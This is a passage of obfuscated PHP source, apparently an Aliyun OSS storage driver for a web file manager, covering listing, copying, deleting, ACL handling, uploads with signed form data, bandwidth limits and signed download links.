$this->getPathOuter($Œ§Üıªû); } return !1; } public function mkdir($¾ìÌ†Ü«, $ËíëõÇ› = REPEAT_SKIP) { if ($this->_isFolder($¾ìÌ†Ü«)) { return $this->getPathOuter($¾ìÌ†Ü«); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¾ìÌ†Ü«)); } catch (OSS\Core\OssException $ÂØóÅŠÂ) { return !1; } return $this->getPathOuter($¾ìÌ†Ü«); } private function fileList($²Ş »ºğ, $”Å¢Ùâ = '', $Ÿ‹Öƒæ = 0) { $ÖŞÄ¿ˆ‹ =& $_SERVER[Æ š¦İÈ]; $²Ş »ºğ = trim($²Ş »ºğ, $ÖŞÄ¿ˆ‹[8]); $¾â«¯Ã = empty($²Ş »ºğ) && $²Ş »ºğ !== $ÖŞÄ¿ˆ‹[192] ? $ÖŞÄ¿ˆ‹[12] : $²Ş »ºğ . $ÖŞÄ¿ˆ‹[8]; $ßÒ¸²è = $ÖŞÄ¿ˆ‹[12]; $Áƒ«×Ñª = 1000; $™Š¥‘ôâ = $this->listItemCache === !1 ? !1 : !0; $©ï£ˆ®ï = $ÖÒ²¡ª€ = array(); while (!0) { check_abort(); $»ÄóØËè = array($ÖŞÄ¿ˆ‹[1382] => $”Å¢Ùâ, $ÖŞÄ¿ˆ‹[1383] => $¾â«¯Ã, $ÖŞÄ¿ˆ‹[1384] => $Áƒ«×Ñª, $ÖŞÄ¿ˆ‹[1385] => $ßÒ¸²è); try { $®²Ã’éÑ = $this->client->listObjects($this->bucket, $»ÄóØËè); } catch (OSS\Core\OssException $ÓÜ’ß®ú) { break; } $ßÒ¸²è = $®²Ã’éÑ->getNextMarker(); $æàü¨–ç = $®²Ã’éÑ->getObjectList(); $ËÇ—…Ş‰ = $®²Ã’éÑ->getPrefixList(); foreach ($æàü¨–ç as $ìñ”®à) { if ($ìñ”®à->getKey() == $¾â«¯Ã) { continue; } $Ä«üÁ‚Ø = $ìñ”®à->getKey(); $ÎØ¢¯… = $ìñ”®à->getSize(); $Ì¹‹»ğ = $ìñ”®à->getLastModified(); $ìÊä‚å = $Ÿ‹Öƒæ ? array($ÖŞÄ¿ˆ‹[32] => $Ä«üÁ‚Ø, $ÖŞÄ¿ˆ‹[80] => $ÎØ¢¯…, $ÖŞÄ¿ˆ‹[198] => strtotime($Ì¹‹»ğ)) : $Ä«üÁ‚Ø; $…Âß²Âê = $ÎØ¢¯… == 0 && substr($Ä«üÁ‚Ø, strlen($Ä«üÁ‚Ø) - 1, 1) == $ÖŞÄ¿ˆ‹[8] ? !0 : !1; if ($™Š¥‘ôâ) { $this->cacheMethod($ÖŞÄ¿ˆ‹[200], $Ä«üÁ‚Ø, $…Âß²Âê); $this->cacheMethod($ÖŞÄ¿ˆ‹[201], $Ä«üÁ‚Ø, array($ÖŞÄ¿ˆ‹[80] => $ÎØ¢¯…, $ÖŞÄ¿ˆ‹[1386] => $ÎØ¢¯…, $ÖŞÄ¿ˆ‹[86] => strtotime($Ì¹‹»ğ), $ÖŞÄ¿ˆ‹[1387] => $Ì¹‹»ğ)); } if ($…Âß²Âê) { $©ï£ˆ®ï[] = $Ä«üÁ‚Ø; continue; } $ÖÒ²¡ª€[] = $ìÊä‚å; } foreach ($ËÇ—…Ş‰ as $„–ÄÀú¸) { $©ï£ˆ®ï[] = $„–ÄÀú¸->getPrefix(); if ($™Š¥‘ôâ) { $this->cacheMethod($ÖŞÄ¿ˆ‹[200], $Ä«üÁ‚Ø, !0); } } if ($ßÒ¸²è === $ÖŞÄ¿ˆ‹[12]) { break; } } if ($™Š¥‘ôâ) { $this->cacheMethod($ÖŞÄ¿ˆ‹[200], $²Ş »ºğ, !0); } return array($ÖŞÄ¿ˆ‹[77] => $©ï£ˆ®ï, $ÖŞÄ¿ˆ‹[76] => $ÖÒ²¡ª€); } public function copyFile($‹»Ä×‘¯, $›ˆ¶şôÀ) { $Œ°ì¬†ª = $this->size($‹»Ä×‘¯); if ($Œ°ì¬†ª < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $‹»Ä×‘¯, $this->bucket, $this->pathEncode($›ˆ¶şôÀ)); } catch (OSS\Core\OssException $öâ±ÙÑ‡) { return !1; } return $this->getPathOuter($›ˆ¶şôÀ); } $Õı…€ê® = $this->multiCopyObject($‹»Ä×‘¯, $›ˆ¶şôÀ, $Œ°ì¬†ª); return $Õı…€ê® ? $this->getPathOuter($›ˆ¶şôÀ) : !1; } private function multiCopyObject($€¢üù€Í, $ÜÒ¶Ï÷Ä, $£Åå“ª) { $‚ªöĞàó =& $_SERVER[Æ š¦İÈ]; try { $í•÷½ãó = array(); if ($ãóé´£¡ = $this->hashMd5($€¢üù€Í)) { $í•÷½ãó = array(OSS\OssClient::OSS_HEADERS => array($‚ªöĞàó[1388] => $ãóé´£¡)); } $À‰ĞÒÉ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÜÒ¶Ï÷Ä), $í•÷½ãó); $²ù€‹šĞ = 1; $ĞßÆû¹ = 0; $”÷«âÑ = array(); $ëêçÏ³¦ = 1024 * 1024 * 10; $Œí´£ˆ¨ = $this->client->generateMultiuploadParts($£Åå“ª, $ëêçÏ³¦); foreach ($Œí´£ˆ¨ as $ë¿İùêè => $˜åÛó¡º) { $ÍÂ…¤Œ = $ĞßÆû¹ + (int) $˜åÛó¡º[$‚ªöĞàó[1389]]; $¯ø¿©ù = (int) $˜åÛó¡º[$‚ªöĞàó[334]] + $ÍÂ…¤Œ - 1; $ŠÖÆ“¿£ = array($‚ªöĞàó[1390] => $ÍÂ…¤Œ, $‚ªöĞàó[1391] => $¯ø¿©ù); $”÷«âÑ[] = $this->client->uploadPartCopy($this->bucket, $€¢üù€Í, $this->bucket, $this->pathEncode($ÜÒ¶Ï÷Ä), $²ù€‹šĞ, $À‰ĞÒÉ, $ŠÖÆ“¿£); $²ù€‹šĞ = $²ù€‹šĞ + 1; } $Ò²ûøº³ = array(); foreach ($”÷«âÑ as $ë¿İùêè => $ ÀßÜˆ“) { $Ò²ûøº³[] = array($‚ªöĞàó[1392] => $ë¿İùêè + 1, $‚ªöĞàó[1393] => $ ÀßÜˆ“); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ÜÒ¶Ï÷Ä), $À‰ĞÒÉ, $Ò²ûøº³); } catch (OSS\Core\OssException $ÍÇØ›õ¢) { return !1; } return !0; } public function moveFile($­ıİõÕ, $ˆ¼¢…•à) { if ($this->copyFile($­ıİõÕ, $ˆ¼¢…•à)) { $this->remove($­ıİõÕ); return $this->getPathOuter($ˆ¼¢…•à); } return !1; } public function delFile($Ç»Ú’ª) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ç»Ú’ª)); } catch (OSS\Core\OssException $âª—‹ôş) { return !1; } return !0; } public function delFolder($ø´’Ìı) { $•™¿”ºù =& $_SERVER[Æ š¦İÈ]; if (!$this->exist($ø´’Ìı)) { return !0; } $this->listItemCache = !1; $ä¶È‘Îç = $this->fileList($ø´’Ìı); $this->listItemCache = !0; $ ‘ä¯Øø = trim($ø´’Ìı, $•™¿”ºù[8]) . $•™¿”ºù[8]; if (!empty($ø´’Ìı) && $ø´’Ìı !== $•™¿”ºù[192] && !in_array($ ‘ä¯Øø, $ä¶È‘Îç[$•™¿”ºù[77]])) { $ä¶È‘Îç[$•™¿”ºù[77]][] = $ ‘ä¯Øø; } $µŞ­Ãö§ = $this->delByBatch($ä¶È‘Îç[$•™¿”ºù[76]]); if (!$µŞ­Ãö§) { return !1; } $µŞ­Ãö§ = $this->delByBatch($ä¶È‘Îç[$•™¿”ºù[77]]); if (!$µŞ­Ãö§) { return !1; } return $this->delFile($ ‘ä¯Øø); } private function delByBatch($˜Î‰Ï«ˆ) { foreach (array_chunk($˜Î‰Ï«ˆ, 1000) as $»øõÕ‘Ó) { try { $this->client->deleteObjects($this->bucket, $»øõÕ‘Ó); } catch (OSS\Core\OssException $ŞáÃòô½) { return !1; } } return !0; } public function rename($òúğ”ìı, $»ôåªñÑ) { return $this->renameObject($òúğ”ìı, $»ôåªñÑ); } private function fileInfo($ØœÄÆÓ•, $¥·¸˜ª§ = false, $‹¹šèİî = array()) { $¶ÀçÌ¢ =& $_SERVER[Æ š¦İÈ]; $Õ¶´¸Øš = array($¶ÀçÌ¢[32] => $this->pathThis($ØœÄÆÓ•), $¶ÀçÌ¢[78] => $this->getPathOuter($ØœÄÆÓ•), $¶ÀçÌ¢[33] => $¶ÀçÌ¢[194], $¶ÀçÌ¢[80] => isset($‹¹šèİî[$¶ÀçÌ¢[80]]) ? $‹¹šèİî[$¶ÀçÌ¢[80]] : 0, $¶ÀçÌ¢[169] => $this->ext($ØœÄÆÓ•)); if ($¥·¸˜ª§) { return $Õ¶´¸Øš; } $Õ¶´¸Øš[$¶ÀçÌ¢[195]] = $Õ¶´¸Øš[$¶ÀçÌ¢[86]] = 0; $Õ¶´¸Øš[$¶ÀçÌ¢[196]] = $Õ¶´¸Øš[$¶ÀçÌ¢[197]] = !0; if (empty($‹¹šèİî)) { $Ùñú–´ø = $this->objectMeta($ØœÄÆÓ•); if (!$Ùñú–´ø) { return $Õ¶´¸Øš; } $‹¹šèİî = array($¶ÀçÌ¢[86] => strtotime($Ùñú–´ø[$¶ÀçÌ¢[1387]]), $¶ÀçÌ¢[80] => $Ùñú–´ø[$¶ÀçÌ¢[1386]] + 0); } if (isset($‹¹šèİî[$¶ÀçÌ¢[80]])) { $Õ¶´¸Øš[$¶ÀçÌ¢[80]] = $‹¹šèİî[$¶ÀçÌ¢[80]]; } if (isset($‹¹šèİî[$¶ÀçÌ¢[86]])) { $Õ¶´¸Øš[$¶ÀçÌ¢[86]] = $‹¹šèİî[$¶ÀçÌ¢[86]]; } if (isset($‹¹šèİî[$¶ÀçÌ¢[198]]) && !trim($Õ¶´¸Øš[$¶ÀçÌ¢[86]])) { $Õ¶´¸Øš[$¶ÀçÌ¢[86]] = $‹¹šèİî[$¶ÀçÌ¢[198]]; } return $Õ¶´¸Øš; } private function folderInfo($ÃáŞÎÊ¬, $êæÕÑ¯ì = false, $¿ÁŠó§‘ = array()) { $òÆ¯Æ—ü =& $_SERVER[Æ š¦İÈ]; $ĞÊ‘ùø‹ = array($òÆ¯Æ—ü[32] => $this->pathThis($ÃáŞÎÊ¬), $òÆ¯Æ—ü[78] => $this->getPathOuter($òÆ¯Æ—ü[8] . $ÃáŞÎÊ¬), $òÆ¯Æ—ü[33] => $òÆ¯Æ—ü[79]); if ($êæÕÑ¯ì) { return $ĞÊ‘ùø‹; } $ĞÊ‘ùø‹[$òÆ¯Æ—ü[195]] = $ĞÊ‘ùø‹[$òÆ¯Æ—ü[86]] = 0; $ĞÊ‘ùø‹[$òÆ¯Æ—ü[196]] = $ĞÊ‘ùø‹[$òÆ¯Æ—ü[197]] = !0; if (empty($¿ÁŠó§‘)) { $ÃáŞÎÊ¬ = rtrim($ÃáŞÎÊ¬, $òÆ¯Æ—ü[8]) . $òÆ¯Æ—ü[8]; $áË™¬ïí = $this->objectMeta($ÃáŞÎÊ¬); if (!$áË™¬ïí) { return $ĞÊ‘ùø‹; } $¿ÁŠó§‘ = array($òÆ¯Æ—ü[195] => $áË™¬ïí[$òÆ¯Æ—ü[513]][$òÆ¯Æ—ü[1394]], $òÆ¯Æ—ü[86] => strtotime($áË™¬ïí[$òÆ¯Æ—ü[1387]])); } if (isset($¿ÁŠó§‘[$òÆ¯Æ—ü[86]])) { $ĞÊ‘ùø‹[$òÆ¯Æ—ü[86]] = $¿ÁŠó§‘[$òÆ¯Æ—ü[86]]; } if (isset($¿ÁŠó§‘[$òÆ¯Æ—ü[195]])) { $ĞÊ‘ùø‹[$òÆ¯Æ—ü[195]] = $¿ÁŠó§‘[$òÆ¯Æ—ü[195]]; } return $ĞÊ‘ùø‹; } public function listPath($âİ ß†¦, $Èøê‰ãŞ = false) { $­Ñ¡Ø“ =& $_SERVER[Æ š¦İÈ]; $Å§á“ = $this->fileList($âİ ß†¦, $­Ñ¡Ø“[8], !0); foreach ($Å§á“[$­Ñ¡Ø“[77]] as $‹ÙêÖ¸ => $ÔÑå­•) { $Å§á“[$­Ñ¡Ø“[77]][$‹ÙêÖ¸] = $this->folderInfo($ÔÑå­•, $Èøê‰ãŞ, $ÔÑå­•); } foreach ($Å§á“[$­Ñ¡Ø“[76]] as $‹ÙêÖ¸ => $ÔÑå­•) { $Å§á“[$­Ñ¡Ø“[76]][$‹ÙêÖ¸] = $this->fileInfo($ÔÑå­•[$­Ñ¡Ø“[32]], $Èøê‰ãŞ, $ÔÑå­•); } return $Å§á“; } public function has($¾ºËÆä, $ˆ¼±¾ = false, $ß–Ş®ª² = true) { $„¿Ôšê× =& $_SERVER[Æ š¦İÈ]; $¾ºËÆä = trim($¾ºËÆä, $„¿Ôšê×[8]); $âÕÜÎœà = empty($¾ºËÆä) && $¾ºËÆä !== $„¿Ôšê×[192] ? $„¿Ôšê×[12] : $¾ºËÆä . $„¿Ôšê×[8]; $½¬†Ôı” = $„¿Ôšê×[12]; $ôÅïŠ” = 500; $Å‘ùû = $«ş¯¥¼ = 0; while (!0) { check_abort(); $ÉŞş‘èª = array($„¿Ôšê×[1382] => $„¿Ôšê×[8], $„¿Ôšê×[1383] => $âÕÜÎœà, $„¿Ôšê×[1384] => $ôÅïŠ”, $„¿Ôšê×[1385] => $½¬†Ôı”); try { $¦Ü»ª = $this->client->listObjects($this->bucket, $ÉŞş‘èª); } catch (OSS\Core\OssException $°ÜØõ˜÷) { break; } $½¬†Ôı” = $¦Ü»ª->getNextMarker(); $ÙÜÛ‹Õº = $¦Ü»ª->getObjectList(); $ŞçöÙÚ¶ = $¦Ü»ª->getPrefixList(); if ($ˆ¼±¾) { if (count($ÙÜÛ‹Õº) > 1 || count($ÙÜÛ‹Õº) == 1 && $ÙÜÛ‹Õº[0]->getKey() != $âÕÜÎœà) { $Å‘ùû += count($ÙÜÛ‹Õº) - 1; } if (!empty($ŞçöÙÚ¶)) { $«ş¯¥¼ += count($ŞçöÙÚ¶); } if ($½¬†Ôı” === $„¿Ôšê×[12]) { break; } continue; } if ($ß–Ş®ª²) { if (!empty($ÙÜÛ‹Õº)) { if (count($ÙÜÛ‹Õº) > 1 || $ÙÜÛ‹Õº[0]->getKey() != $âÕÜÎœà) { return !0; } } } else { if (!empty($ŞçöÙÚ¶)) { return !0; } } if ($½¬†Ôı” === $„¿Ôšê×[12]) { break; } } if ($ˆ¼±¾) { return array($„¿Ôšê×[204] => $Å‘ùû, $„¿Ôšê×[205] => $«ş¯¥¼); } return !1; } public function listAll($º‚ÊÑñ) { $‚å¹«òÂ =& $_SERVER[Æ š¦İÈ]; $öÄÑ–ÙÇ = $this->fileList($º‚ÊÑñ, $‚å¹«òÂ[12], !0); $ÃÑ¬«£˜ = array(); foreach ($öÄÑ–ÙÇ[$‚å¹«òÂ[76]] as $Å¹ÆÙŒ¡) { $ÃÑ¬«£˜[$Å¹ÆÙŒ¡[$‚å¹«òÂ[32]]] = $Å¹ÆÙŒ¡[$‚å¹«òÂ[80]]; } foreach ($öÄÑ–ÙÇ[$‚å¹«òÂ[77]] as $Å¹ÆÙŒ¡) { if (is_string($Å¹ÆÙŒ¡)) { $ÃÑ¬«£˜[$Å¹ÆÙŒ¡] = 0; } } return $this->listAllFiles($º‚ÊÑñ, array_keys($ÃÑ¬«£˜), $ÃÑ¬«£˜); } public function canRead($ñ˜´¢) { $Õ´õ¯ñ =& $_SERVER[Æ š¦İÈ]; $‡ƒíÅ = $this->pathAcl($ñ˜´¢); return $‡ƒíÅ == $Õ´õ¯ñ[1395] || $‡ƒíÅ == $Õ´õ¯ñ[552] ? !0 : !1; } public function canWrite($Ö«¯´§Ÿ) { $¼Í”úğ› = $this->pathAcl($Ö«¯´§Ÿ); return $¼Í”úğ› == $_SERVER[Æ š¦İÈ][552] ? !0 : !1; } public function pathAcl($‹˜­Œ©ı) { $à–°éã =& $_SERVER[Æ š¦İÈ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¾íŠ°ü = $this->client->getObjectAcl($this->bucket, $this->pathEncode($‹˜­Œ©ı)); } catch (OSS\Core\OssException $º·Üü©’) { return !1; } $¥‡È˜ƒ = $¾íŠ°ü == $à–°éã[37] ? $this->bucketAcl : $¾íŠ°ü; if ($¥‡È˜ƒ == $à–°éã[1396]) { return $à–°éã[1395]; } if ($¥‡È˜ƒ == $à–°éã[1397]) { return $à–°éã[552]; } return $¥‡È˜ƒ; } private function chmodPath($ØïØÕÑì, $©ìÖÉ¿± = '') { $ÛÈüˆ»Å =& $_SERVER[Æ š¦İÈ]; $Ì¬ã´Ãù = empty($©ìÖÉ¿±) ? $ÛÈüˆ»Å[1397] : $©ìÖÉ¿±; $‡«¥Í‘ó = array($ÛÈüˆ»Å[37], $ÛÈüˆ»Å[193], $ÛÈüˆ»Å[1396], $ÛÈüˆ»Å[1397]); if (!in_array($Ì¬ã´Ãù, $‡«¥Í‘ó)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ØïØÕÑì), $Ì¬ã´Ãù); } catch (OSS\Core\OssException $½ãÊøñÊ) { return !1; } return !0; } public function getContent($ôàéŒÁ) { return $this->fileSubstr($ôàéŒÁ, -1); } public function setContent($’ÅÄ¨š, $¼½°İû = '') { $ô£‚êØª =& $_SERVER[Æ š¦İÈ]; try { $®Ş±éƒ— = $this->trafficLimit($ô£‚êØª[1398]); $Ù»ìƒ¢Ü = $this->client->putObject($this->bucket, $this->pathEncode($’ÅÄ¨š), $¼½°İû, $®Ş±éƒ—); } catch (OSS\Core\OssException $å‰À‰Û„) { return !1; } $¹ûêäß = array($ô£‚êØª[1388] => trim($Ù»ìƒ¢Ü[$ô£‚êØª[1399]], $ô£‚êØª[119]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($’ÅÄ¨š))); $this->updateObjMeta($’ÅÄ¨š, $¹ûêäß); return isset($Ù»ìƒ¢Ü[$ô£‚êØª[1400]][$ô£‚êØª[1347]]) ? !0 : !1; } private function updateObjMeta($ã¿æÅœÃ, $Í™˜ª¹à) { $ã¿æÅœÃ = $this->pathEncode($ã¿æÅœÃ); try { $ºÔÄëş¿ = array(OSS\OssClient::OSS_HEADERS => $Í™˜ª¹à); $this->client->copyObject($this->bucket, $ã¿æÅœÃ, $this->bucket, $ã¿æÅœÃ, $ºÔÄëş¿); } catch (OSS\Core\OssException $ŞÁúÛÕ•) { return !1; } return !0; } public function upload($ŞÀÌ¥¾¢, $ª‚ş¸¢£, $ãÄ¿Ïî¼ = false, $ÍÑ½è©ï = REPEAT_REPLACE) { $ÀÙãìÀÇ =& $_SERVER[Æ š¦İÈ]; $‹üıæÖÎ = trim($ŞÀÌ¥¾¢, $ÀÙãìÀÇ[8]); $ÍŒ…ŞÑ¥ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ÀÙãìÀÇ[1388] => @md5_file($ª‚ş¸¢£)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ŞÀÌ¥¾¢))); $ÍŒ…ŞÑ¥ = $this->trafficLimit($ÀÙãìÀÇ[1398], $ÍŒ…ŞÑ¥); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($‹üıæÖÎ), $ª‚ş¸¢£, $ÍŒ…ŞÑ¥); } catch (OSS\Core\OssException $ğĞ‹ÁÉø) { return !1; } return $this->getPathOuter($ŞÀÌ¥¾¢); } public function getHost() { $»ñµ×ãö =& $_SERVER[Æ š¦İÈ]; $ˆ™üÚ„¡ = explode($»ñµ×ãö[178], parent::getHost()); return $ˆ™üÚ„¡[0] . $»ñµ×ãö[178] . $this->bucket . $»ñµ×ãö[10] . $ˆ™üÚ„¡[1]; } public function uploadFormData($ø­‡Ù, $³åÕñ•œ = 3600) { $¶œ•Ãú‹ =& $_SERVER[Æ š¦İÈ]; if (!($û©¨œ¨ò = $this->getHost())) { return !1; } $‘¢À¯ â = $³åÕñ•œ; $ïÅ¬›Ú± = date($¶œ•Ãú‹[1401], time() + $‘¢À¯ â); $ÎöµÎÛŠ = new DateTime($ïÅ¬›Ú±); $°ÚÂ™• = $ÎöµÎÛŠ->format(DateTime::ISO8601); $ë¥€Ş»¢ = strpos($°ÚÂ™•, $¶œ•Ãú‹[293]); $°ÚÂ™• = substr($°ÚÂ™•, 0, $ë¥€Ş»¢) . $¶œ•Ãú‹[1402]; $Ÿ®âÖò€ = 1048576000 * 5; $•ë‚Í‡½ = $this->pathFather($ø­‡Ù); $÷€ß’‹ = array($¶œ•Ãú‹[1301] => $°ÚÂ™•, $¶œ•Ãú‹[1302] => array(array($¶œ•Ãú‹[1403], 0, $Ÿ®âÖò€), array($¶œ•Ãú‹[1305], $¶œ•Ãú‹[1306], $•ë‚Í‡½))); $¹ôÛ‘” = base64_encode(json_encode($÷€ß’‹)); $ÆèÑğÏÚ = base64_encode(hash_hmac($¶œ•Ãú‹[229], $¹ôÛ‘”, $this->secret, !0)); $“î‹«Ë— = array($¶œ•Ãú‹[1311] => $¹ôÛ‘”, $¶œ•Ãú‹[1404] => $this->accessKey, $¶œ•Ãú‹[1307] => $¶œ•Ãú‹[1299], $¶œ•Ãú‹[1405] => $ÆèÑğÏÚ, $¶œ•Ãú‹[176] => $û©¨œ¨ò); $“î‹«Ë— = $this->trafficLimit($¶œ•Ãú‹[1398], $“î‹«Ë—); return $“î‹«Ë—; } public function multiUploadFormData($“È•“ï, $ÛÛ“ĞıÉ = 3600) { $Ù±²Å·– =& $_SERVER[Æ š¦İÈ]; if (!($æåÕ»ø¥ = $this->getHost())) { return !1; } $ÎÙĞ‹ü = $this->trafficLimit($Ù±²Å·–[1398]); $ù‰™³±ï = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($“È•“ï), $ÎÙĞ‹ü); return array($Ù±²Å·–[220] => $ù‰™³±ï, $Ù±²Å·–[176] => $æåÕ»ø¥ . $Ù±²Å·–[8] . $this->pathEncode($“È•“ï), $Ù±²Å·–[221] => gmdate($Ù±²Å·–[1406]), $Ù±²Å·–[95] => $“È•“ï); } public function multiUploadAuthData($ŠÑß© –, $†í±ıÀ = array()) { $¦ÉƒÄ¾ï =& $_SERVER[Æ š¦İÈ]; $Ü®È¼µ = isset($†í±ıÀ[$¦ÉƒÄ¾ï[221]]) ? $†í±ıÀ[$¦ÉƒÄ¾ï[221]] : gmdate($¦ÉƒÄ¾ï[1406]); $ÓÖ¡‚ß = isset($†í±ıÀ[$¦ÉƒÄ¾ï[169]]) ? $†í±ıÀ[$¦ÉƒÄ¾ï[169]] : $¦ÉƒÄ¾ï[12]; $øë‡”ÏÚ = $ŠÑß© –; if (isset($†í±ıÀ[$¦ÉƒÄ¾ï[95]])) { $øë‡”ÏÚ = $†í±ıÀ[$¦ÉƒÄ¾ï[95]]; unset($†í±ıÀ[$¦ÉƒÄ¾ï[95]]); } if (isset($†í±ıÀ[$¦ÉƒÄ¾ï[222]])) { $†í±ıÀ[$¦ÉƒÄ¾ï[221]] = $Ü®È¼µ; return $this->listUploadParts($øë‡”ÏÚ, $†í±ıÀ); } $ä§¹¢¥ó = array($¦ÉƒÄ¾ï[223], $¦ÉƒÄ¾ï[12], $¦ÉƒÄ¾ï[120], $Ü®È¼µ, "\170\55\x6f\163\x73\55\144\141\164\145\x3a{$Ü®È¼µ}", $¦ÉƒÄ¾ï[8] . $this->bucket . $¦ÉƒÄ¾ï[8] . $øë‡”ÏÚ . $ÓÖ¡‚ß); if (strpos($ÓÖ¡‚ß, $¦ÉƒÄ¾ï[224]) === 0) { $ä§¹¢¥ó[0] = $¦ÉƒÄ¾ï[225]; if ($üé«è’‰ = $this->trafficLimit($¦ÉƒÄ¾ï[1398])) { $øë‡”ÏÚ = $¦ÉƒÄ¾ï[1407]; array_splice($ä§¹¢¥ó, 5, 0, $øë‡”ÏÚ . $¦ÉƒÄ¾ï[4] . $üé«è’‰[$øë‡”ÏÚ]); } } if (isset($†í±ıÀ[$¦ÉƒÄ¾ï[226]]) && $†í±ıÀ[$¦ÉƒÄ¾ï[226]] == $¦ÉƒÄ¾ï[227]) { $ä§¹¢¥ó[0] = $¦ÉƒÄ¾ï[227]; } if (!empty($†í±ıÀ[$¦ÉƒÄ¾ï[1408]])) { $Ú¼¹ı‘¡ = array_merge(array($ä§¹¢¥ó[4]), $†í±ıÀ[$¦ÉƒÄ¾ï[1408]]); sort($Ú¼¹ı‘¡); $ä§¹¢¥ó[4] = implode($¦ÉƒÄ¾ï[228], $Ú¼¹ı‘¡); } $ùÎã®¢ê = implode($¦ÉƒÄ¾ï[228], $ä§¹¢¥ó); $ŸË€Æ© = base64_encode(hash_hmac($¦ÉƒÄ¾ï[229], $ùÎã®¢ê, $this->secret, !0)); $Óƒ†´ßÓ = $¦ÉƒÄ¾ï[1372] . $this->accessKey . $¦ÉƒÄ¾ï[4] . $ŸË€Æ©; if (strpos($ÓÖ¡‚ß, $¦ÉƒÄ¾ï[224]) === 0) { $Óƒ†´ßÓ = array($¦ÉƒÄ¾ï[231] => $Óƒ†´ßÓ, $¦ÉƒÄ¾ï[221] => $Ü®È¼µ); if ($üé«è’‰) { $Óƒ†´ßÓ = array_merge($Óƒ†´ßÓ, $üé«è’‰); } } return $Óƒ†´ßÓ; } public function listUploadParts($ãÖ¥ ã, $ü²Î™®š) { $Å©²ÎÓÄ =& $_SERVER[Æ š¦İÈ]; $ÀšİÛí³ = parse_url_query($ü²Î™®š[$Å©²ÎÓÄ[169]]); $ã¯¾ëòœ = $this->client->listParts($this->bucket, $this->pathEncode($ãÖ¥ ã), $ÀšİÛí³[$Å©²ÎÓÄ[220]]); $éÁ€æ¯á = $ã¯¾ëòœ->getListPart(); $¬–´ûü’ = array(); foreach ($éÁ€æ¯á as $µÖ§ƒÜ›) { $¬–´ûü’[] = array($Å©²ÎÓÄ[1392] => $µÖ§ƒÜ›->getPartNumber(), $Å©²ÎÓÄ[1393] => trim($µÖ§ƒÜ›->getETag(), $Å©²ÎÓÄ[119])); } unset($ü²Î™®š[$Å©²ÎÓÄ[222]], $ü²Î™®š[$Å©²ÎÓÄ[226]]); $Ù·ø€®ş = $this->multiUploadAuthData($ãÖ¥ ã, $ü²Î™®š); if (empty($Ù·ø€®ş)) { return !1; } return array($Å©²ÎÓÄ[231] => $Ù·ø€®ş, $Å©²ÎÓÄ[221] => $ü²Î™®š[$Å©²ÎÓÄ[221]], $Å©²ÎÓÄ[233] => $¬–´ûü’); } public function download($˜ÄŠËÌ‰, $À½¸ø‚) { if ($this->isFolder($˜ÄŠËÌ‰)) { return !1; } try { $×Í°£¾î = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $À½¸ø‚); $×Í°£¾î = $this->trafficLimit($_SERVER[Æ š¦İÈ][110], $×Í°£¾î); $this->client->getObject($this->bucket, $this->pathEncode($˜ÄŠËÌ‰), $×Í°£¾î); } catch (OSS\Core\OssException $ñäÕç«Š) { return !1; } return $À½¸ø‚; } public function fileSubstr($ç…ˆØïÖ, $îÉÄ³Ã´ = 0, $¦–ê×ø = false) { if ($îÉÄ³Ã´ === -1) { $¼ä»§½æ = array(); } else { if ($¦–ê×ø === !1) { $„¶Œ°Ì = $this->size($ç…ˆØïÖ); } else { $„¶Œ°Ì = $îÉÄ³Ã´ + $¦–ê×ø - 1; } $¼ä»§½æ = array(OSS\OssClient::OSS_RANGE => "{$îÉÄ³Ã´}\x2d{$„¶Œ°Ì}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ç…ˆØïÖ), $¼ä»§½æ); } catch (OSS\Core\OssException $íÀ´ßÁ˜) { think_exception($íÀ´ßÁ˜->getMessage()); return !1; } } private function trafficLimit($ãÂ·Àäğ, $†İ«§“È = array()) { $è”à¨€– =& $_SERVER[Æ š¦İÈ]; if ($ãÂ·Àäğ == $è”à¨€–[1398] && $this->isUploadServer() || $ãÂ·Àäğ == $è”à¨€–[110] && $this->isFileOutServer()) { return $†İ«§“È; } $§ê‡¯¯¬ = floatval($GLOBALS[$è”à¨€–[6]][$è”à¨€–[90]][$è”à¨€–[108]][$ãÂ·Àäğ]) * 1024 * 1024 * 8; if (!$§ê‡¯¯¬) { return $†İ«§“È; } $§ê‡¯¯¬ = $§ê‡¯¯¬ < 819200 ? 819200 : ($§ê‡¯¯¬ > 838860800 ? 838860800 : $§ê‡¯¯¬); $†İ«§“È[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($§ê‡¯¯¬); return $†İ«§“È; } public function link($Šµ³¿µ, $ŞƒÉšÌñ = array()) { $úÓ¤øå =& $_SERVER[Æ š¦İÈ]; if (!$this->exist($Šµ³¿µ) || $this->isFolder($Šµ³¿µ)) { return !1; } try { $ŞƒÉšÌñ = $this->trafficLimit($úÓ¤øå[110], $ŞƒÉšÌñ); $Õ¯·…ğ† = $this->client->signUrl($this->bucket, $this->pathEncode($Šµ³¿µ), 3600 * 12, $úÓ¤øå[227], $ŞƒÉšÌñ); return $this->getCdnLink($Õ¯·…ğ†); } catch (OSS\Core\OssException $ü‚Æ¸ü¨) { return !1; } } public function fileOut($¢à’Œ†û, $úÃçïê³ = false, $×·Ê¤ = false, $¾š„ëı = '') { $ôñÕ™Ÿ« =& $_SERVER[Æ š¦İÈ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¢à’Œ†û, $úÃçïê³, $×·Ê¤, $¾š„ëı); } if (!$×·Ê¤) { $×·Ê¤ = $this->pathThis($¢à’Œ†û); } $×·Ê¤ = rawurlencode($×·Ê¤); $åê’É‘ = get_file_mime(get_path_ext($×·Ê¤)); if ($åê’É‘ == 